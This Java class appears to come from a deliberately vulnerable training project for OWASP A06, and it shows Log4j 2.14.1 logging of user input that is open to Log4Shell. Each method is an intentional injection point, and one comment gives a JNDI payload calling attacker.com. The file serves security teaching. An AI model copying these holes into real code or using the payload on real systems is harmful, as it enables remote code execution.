package com.example.vulnerabilities;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * OWASP A06:2021 - Vulnerable and Outdated Components
 *
 * Demonstrates use of vulnerable dependencies with known CVEs.
 * This class uses Log4j 2.14.1 which is vulnerable to CVE-2021-44228 (Log4Shell).
 */
public class A06_VulnerableComponents {

    // INSECURE: Using Log4j 2.14.1 - vulnerable to CVE-2021-44228 (Log4Shell)
    private static final Logger logger = LogManager.getLogger(A06_VulnerableComponents.class);

    /**
     * VULNERABILITY: Log4Shell (CVE-2021-44228)
     * Log4j 2.14.1 is vulnerable to remote code execution via JNDI lookup
     * User input in log messages can trigger JNDI injection
     */
    public void logUserInput(String userInput) {
        // INSECURE: User input logged with vulnerable Log4j version
        // Payload like ${jndi:ldap://attacker.com/evil} would trigger RCE
        logger.info("User input: {}", userInput);
    }

    /**
     * VULNERABILITY: Log4Shell in error messages
     * Exception messages containing user input
     */
    public void logError(String username) {
        try {
            throw new Exception("Login failed for user: " + username);
        } catch (Exception e) {
            // INSECURE: Exception message may contain JNDI injection payload
            logger.error("Error occurred: {}", e.getMessage());
        }
    }

    /**
     * VULNERABILITY: Log4Shell in header logging
     * HTTP headers logged without sanitization
     */
    public void logHttpHeaders(String userAgent, String referer) {
        // INSECURE: Headers can contain malicious JNDI payloads
        logger.info("Request from User-Agent: {}, Referer: {}", userAgent, referer);
    }

    /**
     * VULNERABILITY: Using vulnerable component version
     * This project depends on Log4j 2.14.1 in pom.xml which has:
     * - CVE-2021-44228 (Log4Shell) - CVSS 10.0 CRITICAL
     * - CVE-2021-45046 - CVSS 9.0 CRITICAL
     * - CVE-2021-45105 - CVSS 7.5 HIGH
     *
     * Should upgrade to Log4j 2.17.1 or later
     */
    public String getVulnerableVersion() {
        return "Log4j 2.14.1 (VULNERABLE)";
    }

    /**
     * VULNERABILITY: Logging sensitive data with vulnerable logger
     * Combines multiple vulnerabilities
     */
    public void processLogin(String username, String ipAddress) {
        // INSECURE: Both vulnerable logging and potential injection point
        logger.warn("Failed login attempt from {} at IP {}", username, ipAddress);
    }

    /**
     * VULNERABILITY: Log4Shell in formatted messages
     * Using message patterns with user-controlled data
     */
    public void logFormattedMessage(String message) {
        // INSECURE: User controls entire message
        logger.info(message);
    }

    /**
     * VULNERABILITY: MDC (Mapped Diagnostic Context) with user input
     * Thread context can also be exploited
     */
    public void logWithContext(String sessionId, String action) {
        // INSECURE: Context values can contain JNDI payloads
        org.apache.logging.log4j.ThreadContext.put("sessionId", sessionId);
        logger.info("User action: {}", action);
        org.apache.logging.log4j.ThreadContext.clearAll();
    }
}
